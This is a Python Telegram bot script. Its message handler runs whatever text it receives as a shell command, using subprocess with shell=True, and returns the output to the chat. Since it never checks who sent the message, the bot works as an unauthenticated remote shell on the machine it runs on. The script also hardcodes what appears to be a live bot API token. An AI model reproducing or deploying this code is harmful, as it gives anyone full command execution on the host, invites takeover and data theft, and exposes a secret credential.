import logging
import subprocess
import os
from telegram import Update
from telegram.ext import filters, MessageHandler, ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id, text="I am your bot")

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == 'ls':
        output1 = subprocess.check_output('ls', shell=True).decode('utf-8')
        print(output1)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=output1)

    elif update.message.text == 'cd':
        output1 = subprocess.check_output('cd', shell=True).decode('utf-8')
        print(output1)

    elif update.message.text == 'pwd':
        output1 = subprocess.check_output('pwd', shell=True).decode('utf-8')
        print(output1)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=output1)

    else:
        try:
            output2 = subprocess.check_output(update.message.text, shell=True).decode('utf-8')
            print(output2)
            if output2:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=output2)
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text='no output')
        except subprocess.CalledProcessError as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

if __name__ == '__main__':
    # API Key goes here
    application = ApplicationBuilder().token('7242021997:AAFWX2-ve9YfLYh4z1mxVazGf798OoPHxG4').build()

    # starting the function
    echo_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), echo)
    start_handler = CommandHandler('start', start)

    application.add_handler(start_handler)
    application.add_handler(echo_handler)

    application.run_polling()
